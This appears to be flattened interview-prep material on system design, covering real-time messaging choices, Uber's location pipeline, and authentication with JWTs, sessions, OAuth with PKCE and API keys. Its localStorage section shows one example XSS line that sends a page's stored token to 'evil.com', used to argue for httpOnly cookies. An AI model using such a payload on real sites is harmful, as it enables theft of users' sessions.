Good providers retry with exponential backoff (Stripe retries for up to 3 days). But you should also build a reconciliation job that periodically calls the provider's API to fetch recent events and compares with what you've received. This catches anything lost during an outage. Never rely solely on webhooks — always have a fallback polling mechanism.

questions.question: Let me put this all together. I give you five real scenarios — tell me which technique you'd pick and why.
questions.tldr: Match the technique to the communication pattern: direction (uni vs bi), frequency, latency needs, and infrastructure constraints.
questions.answer: The decision is never about which technology is "best." It's about which fits the specific communication pattern.

rows: Bidirectional, high frequency (100+ msgs/sec per channel), low latency required. SSE can't send messages back.
Server-only push, text stream, auto-reconnect. WebSocket is overkill — client doesn't send during streaming.
Driver sends location every 4s (bidirectional). Server pushes ETA updates. Both sides are active.
Server-to-server, event-driven, infrequent. Your server doesn't need a persistent connection to Stripe.
Server pushes log lines as they happen. Client only watches. Auto-reconnect handles page refresh.
Updates every few minutes. SSE/WebSocket are overkill. Long poll checks and waits. Gmail used this for years.
SSE if display-only. WebSocket if the user can place trades (bidirectional needed).
MQTT is purpose-built for IoT (lightweight, QoS levels). WebSocket for browser-based dashboards consuming the data.

points: Decision flowchart — (1) Server-to-server async events? → Webhook. (2) Client needs to send data in real-time? → WebSocket. (3) Server-only push, text data? → SSE. (4) Simple, low-frequency checks? → Long polling. (5) Need broad compatibility? → Long polling as fallback.

Hybrid approaches — Many production systems use multiple techniques. Slack uses WebSockets for desktop but falls back to long polling when WebSockets are blocked by corporate firewalls. Discord uses WebSockets for messages but webhooks for bot integrations.

questions.question: How does Uber track 5 million drivers in real-time without melting their servers?
questions.tldr: WebSocket connections with a location ingestion pipeline: driver → WebSocket → message queue → geospatial index → rider's app. Fan-out through pub/sub.
questions.answer: This is a classic system design question that combines real-time communication with geospatial data processing at extreme scale.
questions.diagram:
graph LR D[Driver App] -->|WS every 4s| GW[Gateway] GW --> Q[Kafka Topic
location-updates] Q --> GI[Geospatial Index
Google S2 cells] GI --> Match[Matching Service] Match --> R[Rider App via WS] style GW fill:#bf5af2,color:#fff style Q fill:#ff9f0a,color:#000 style GI fill:#30d158,color:#000
questions.diagramCaption: Uber's location pipeline — ingest, index, match, push
points: Driver → Server (ingest) — Each driver's app sends GPS coordinates over a persistent WebSocket every 4 seconds. That's 5M drivers x 15 updates/minute = 75 million location updates per minute.
Message queue (buffer) — Location updates hit a Kafka topic. This decouples ingestion from processing. Even if the geospatial service is slow, updates aren't lost.

Geospatial index (query) — Locations are indexed using Google S2 cells (the earth divided into hierarchical cells). "Find all drivers within 2km of rider" becomes a cell-range query — fast even with millions of entries.
Rider ← Server (push) — When a rider opens the app, they subscribe to a region. The server pushes nearby driver locations via WebSocket. Only relevant updates are sent — not all 5M drivers.

Key insight — The system is a pipeline: ingest (WebSocket) → buffer (Kafka) → index (geospatial) → push (WebSocket). Each component scales independently. The driver WebSocket tier doesn't know about riders, and vice versa.

takeaways: Short polling — Simple but wasteful. Only for low-frequency, non-critical updates.
Long polling — Simulates push over HTTP. Good fallback when WebSockets are blocked.
SSE — Server-only push with auto-reconnect. Used by ChatGPT, GitHub, live feeds.
WebSocket — Bidirectional, lowest latency. Required for chat, gaming, collaboration.
Webhooks — Server-to-server event push. Always verify signatures, process idempotently.
Decision rule — Bidirectional? WebSocket. Server push only? SSE. Server-to-server? Webhook. Fallback? Long poll.
Uber pattern — WebSocket ingest → Kafka buffer → geospatial index → WebSocket push to riders.

chapters.title: Authentication: JWTs, Sessions, and OAuth
chapters.subtitle: Stateless vs stateful auth — JWT structure, signing, refresh tokens, revocation, OAuth flows, and the mistakes that get you rejected.

questions.question: You're designing a system with 20 microservices. A user logs in once. How does every service know who they are?
questions.tldr: Use a JWT (JSON Web Token) — a self-contained signed token that each service can verify locally without calling an auth server. Stateless auth scales horizontally.
questions.answer: This is the core problem of distributed authentication. In a monolith, you check a session in memory. In microservices, there's no shared memory. You need a token that carries identity and can be verified anywhere.
questions.diagram:
sequenceDiagram
  participant U as User
  participant Auth as Auth Service
  participant API as API Gateway
  participant Svc as Order Service
  U->>Auth: POST /login (email, password)
  Auth-->>U: JWT (signed token)
  U->>API: GET /orders (Bearer: JWT)
  API->>API: Verify JWT signature
  API->>Svc: Forward request + user claims
  Svc-->>U: 200 OK (orders)
questions.diagramCaption: JWT auth flow — token verified at gateway, no DB lookup needed
points: How JWT works — The auth service signs a token containing user claims (user_id, role, exp). Any service with the public key can verify the signature locally. No database call needed to check "is this user logged in?" — the token IS the proof.
JWT structure — Three parts: header.payload.signature (base64-encoded, dot-separated). Header = algorithm. Payload = claims (sub, iat, exp, custom). Signature = HMAC or RSA sign of header+payload.

Why it scales — Session auth requires a central session store (Redis/DB) that every service queries. JWT requires nothing — each service verifies the signature with a key. No central bottleneck, no session store to scale.
Real-world — Auth0, Firebase Auth, AWS Cognito all issue JWTs. Google's internal auth between services uses signed tokens. Every OAuth 2.0 provider returns JWTs as access tokens.

questions.question: OK wait. If the JWT is self-contained and you don't check a database, how do you log someone out? How do you revoke a stolen token?
questions.tldr: You can't revoke a JWT directly — it's valid until it expires. Use short-lived access tokens (15 min) + long-lived refresh tokens to balance security and usability.
questions.answer: This is the biggest weakness of JWTs, and the #1 interview question that trips up candidates. If you only say "use JWT," the interviewer will ask this. Be ready.
questions.diagram:
sequenceDiagram
  participant U as User
  participant Auth as Auth Service
  participant DB as Token Store
  U->>Auth: Login
  Auth-->>U: Access Token (15min) + Refresh Token (7d)
  Note over U: Access token expires
  U->>Auth: POST /refresh (refresh_token)
  Auth->>DB: Is refresh token valid?
  DB-->>Auth: Yes
  Auth-->>U: New access token (15min)
  Note over U: User logs out
  U->>Auth: POST /logout (refresh_token)
  Auth->>DB: Revoke refresh token
questions.diagramCaption: Token rotation — short access tokens, revocable refresh tokens

rows: Stolen token is useful for limited time. User needs to refresh often.
Each refresh issues a new refresh token and invalidates the old
If an attacker uses a stolen refresh token, the real user's next refresh fails — alerting them.
On logout, add token ID (jti) to Redis denylist
Services must check denylist on every request — partially negates "stateless" benefit.
Store a version counter per user. Bump on password change.
JWT includes version; services reject if version < current. Requires a user lookup.

points: The practical solution — Short-lived access tokens (15 min) + long-lived refresh tokens (7-30 days) stored server-side. Access tokens are stateless (no DB check). Refresh tokens are stateful (checked against DB). Best of both worlds.
On logout — Revoke the refresh token in the database. The access token will expire in <=15 minutes. For immediate revocation (compromised account), add the access token's jti to a Redis denylist.
On password change — Revoke ALL refresh tokens for that user. Bump a user version counter. Existing access tokens with the old version are rejected.

Interview tip — Never say "JWTs are stateless" without acknowledging the revocation problem. The complete answer is: "Access tokens are stateless for 99% of requests. Refresh tokens and revocation add a small stateful layer for security."
questions.followup:
"If you need a denylist anyway, why not just use sessions?"

Because the denylist is tiny and rarely checked. Sessions require a lookup on EVERY request. The denylist only has recently revoked tokens (a few thousand entries with TTL). It's a much smaller operational burden than a full session store. But yes — if your system is a monolith with <10K users, sessions are simpler and perfectly fine.

questions.question: A junior dev on your team stores JWTs in localStorage. What's the problem and where should tokens go?
questions.tldr: localStorage is vulnerable to XSS attacks — any injected script can steal the token. Store tokens in httpOnly cookies that JavaScript can't access.
questions.answer: This is a common security mistake that interviewers love to test. Where you store the token is as important as how you generate it.

rows: HIGH — any JS can read it
<mark>Never for auth tokens.</mark> OK for non-sensitive preferences.
Same issue. Gone on tab close, but still XSS-vulnerable.
Best for auth tokens. Add SameSite=Strict + CSRF token.
Most secure but lost on page refresh. Use with refresh token in cookie.

points: The XSS attack — If an attacker injects <script>fetch('evil.com/?'+localStorage.getItem('token'))</script> into your page, they steal every token from localStorage. One XSS vulnerability = every user's session compromised.

httpOnly cookie solution — Set Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict; Path=/. The browser sends it automatically on every request, but JavaScript cannot read it. An XSS attack can't steal what it can't access.

CSRF protection — Cookies are sent automatically, which enables CSRF attacks. Mitigate with: (1) SameSite=Strict (browser won't send cookie from cross-origin requests), (2) CSRF token in a header that the attacker can't forge.

The modern best practice — Access token in memory (JS variable). Refresh token in httpOnly cookie. On page load, call /refresh to get a new access token from the cookie-based refresh token. This is how Auth0 and most modern SPAs handle it.

questions.question: "Login with Google" — walk me through exactly what happens. What is OAuth 2.0 actually doing?
questions.tldr: OAuth 2.0 Authorization Code Flow: your app redirects to Google, user consents, Google returns a code, your server exchanges it for tokens. The user's Google password never touches your server.
questions.answer: OAuth 2.0 is a delegation protocol — the user grants your app limited access to their Google account without sharing their password. It's not authentication by itself (that's OpenID Connect on top of OAuth).
questions.diagram:
sequenceDiagram
  participant U as User
  participant App as Your App
  participant G as Google
  U->>App: Click "Login with Google"
  App->>G: Redirect to Google consent
  G->>U: "Allow MyApp to see your profile?"
  U->>G: Allow
  G->>App: Redirect back with auth code
  App->>G: Exchange code for tokens (server-side)
  G-->>App: Access token + ID token (JWT)
  App-->>U: Logged in! (session created)
questions.diagramCaption: OAuth 2.0 Authorization Code Flow — the most secure standard flow
points: Why the "code" step? — Google returns a short-lived authorization code in the URL redirect. Your server exchanges it for tokens server-to-server. The access token never appears in the browser URL or history — this prevents token leakage.

PKCE (Proof Key for Code Exchange) — For mobile and SPAs, add PKCE: the client generates a random code_verifier, sends a hash (code_challenge) with the auth request. The server sends the original verifier when exchanging the code. This prevents code interception attacks. PKCE is now required for all public clients.

OpenID Connect (OIDC) — OAuth is for authorization ("can this app access my photos?"). OIDC adds authentication ("who is this user?"). OIDC returns an id_token (JWT with user info: email, name, picture) alongside the access token. "Login with Google" uses OIDC, not raw OAuth.
Common mistake — Using the Implicit Flow (tokens in URL fragment). This was designed for old browsers and is insecure. Always use Authorization Code Flow with PKCE. The Implicit Flow is deprecated.
questions.followup:
"What's the difference between OAuth and SAML? When would you use SAML?"

SAML is the older enterprise protocol (XML-based, heavy). OAuth/OIDC is the modern web standard (JSON/JWT-based, lighter). Use SAML when integrating with enterprise identity providers (Okta, Active Directory) that require it. Use OIDC for consumer apps ("Login with Google/GitHub"). If you're building a new system, always choose OIDC over SAML unless enterprise customers mandate SAML.

questions.question: Your monolith used sessions. You're migrating to microservices. Do you switch everything to JWTs, or can sessions still work?
questions.tldr: Sessions can work with a centralized store (Redis), but JWTs reduce cross-service coupling. Most systems use a hybrid: JWT for service-to-service, sessions for user-facing.
questions.answer: This is a pragmatic question — there's no universal "JWT is better than sessions" answer. The right choice depends on your architecture.

rows: Redis is the bottleneck (but handles millions)

points: Sessions are not dead — If you have a monolith or <5 services, server-side sessions with Redis are simpler, more secure (instant revocation), and perfectly scalable. Netflix's user-facing auth uses sessions backed by a distributed store.

JWT shines across boundaries — When service A calls service B calls service C, passing a JWT means no service needs to call a central auth store. The token carries the proof. This reduces latency and coupling.

The hybrid approach — User logs in → server creates a session (Redis) and issues a JWT for downstream services. The gateway translates: incoming session cookie → validated → attach JWT to internal requests. External = session, internal = JWT.

Real-world example — Shopify uses sessions for merchant login (server-rendered admin). API consumers get OAuth tokens (JWT). Internal services use signed service tokens. Three auth mechanisms, each optimized for its consumer.

questions.question: You're building a public API. Clients need to authenticate. What are your options beyond OAuth?
questions.tldr: API keys for simple server-to-server, OAuth for user-delegated access, JWT for stateless service auth. Most public APIs offer multiple options.
questions.answer: Different consumers need different auth mechanisms. A mobile app authenticating a user is a different problem than a cron job calling your API.

rows: Static key in header: X-API-Key: abc123
User-specific access (key is per-app, not per-user)
User authorizes, server gets scoped token
Both client and server present certificates
Client signs request with secret key
Browser apps (secret can't live in client)

points: API keys are NOT authentication — They identify the calling application, not the user. An API key answers "which app is calling?" not "which user is calling?" For user-level access, you need OAuth.

Stripe's approach — Publishable key (pk_live_...) for client-side (safe to expose, limited operations). Secret key (sk_live_...) for server-side (full access, never exposed). This two-key model is the standard for payment APIs.

AWS uses HMAC — Every AWS API call is signed with your secret key using HMAC-SHA256. The signature includes the timestamp, preventing replay attacks. This is more secure than sending the key directly but more complex to implement.

In interviews — Show you pick the auth method based on the threat model. "For our public API, I'd use API keys for rate limiting and OAuth for user data access. Internal services use mTLS for zero-trust."

questions.question: The interviewer asks: "Your JWT has a 1-hour expiry but I need real-time permission changes. A user gets banned — they still have a valid token. What do you do?"
questions.tldr: Either shorten token expiry aggressively (5 min) and accept the refresh overhead, or maintain a lightweight denylist in Redis that the gateway checks.
questions.answer: This is the tension between stateless efficiency and real-time control. There's no free lunch — every solution trades performance for control or vice versa.
points: Option 1: Short-lived tokens (5 min) — The banned user's token expires in 5 minutes max. Acceptable for most use cases. Trade-off: more frequent token refreshes increase auth service load.

Option 2: Gateway denylist — On ban, add the user's JWT jti (or sub) to a Redis set. The gateway checks this set on every request. Set entries have a TTL matching the max token lifetime. Trade-off: you're adding a stateful check, which partially defeats the stateless benefit of JWT.

Option 3: Event-driven invalidation — On ban, publish an event to Kafka/Redis pub-sub. All gateway instances subscribe and update a local in-memory denylist. Near-instant propagation, no Redis call per request. Trade-off: eventual consistency — a ~100ms window where the token might still work.

Option 4: Claim versioning — Each user has a token_version in the DB. JWT includes this version. On ban, bump the version. Services check: if JWT version < DB version, reject. Trade-off: requires a DB or cache lookup per request for the user's version.

The right answer in interviews — "I'd combine short expiry (15 min) with a Redis denylist at the gateway for immediate revocation of compromised accounts. The denylist is small (only recently banned users) and checked with an O(1) Redis lookup."
questions.followup:
"What about permission changes — not banning, but changing a user's role from admin to viewer?"

Don't put granular permissions in the JWT. The JWT carries identity (user_id) and basic claims (role). Fine-grained permissions (can_edit_project_42) should be checked at the service level against a permissions service or database. JWTs carry identity, not authorization policies. Policies change too frequently to embed in a token.

takeaways: JWT — Self-contained signed token. Stateless verification. Can't revoke without extra infrastructure.
Sessions — Server-side state in Redis. Instant revocation. Simpler for monoliths.
Access + Refresh tokens — Short-lived access (15 min) + long-lived refresh (7-30 days). Best of both worlds.
Never store tokens in localStorage — Use httpOnly cookies with SameSite=Strict.
OAuth 2.0 + PKCE — Authorization Code flow. The only secure flow for public clients. Implicit flow is deprecated.
API keys vs OAuth — Keys identify apps. OAuth identifies users. Different problems.
Revocation — Short expiry + Redis denylist at gateway. JWTs carry identity, not authorization policies.
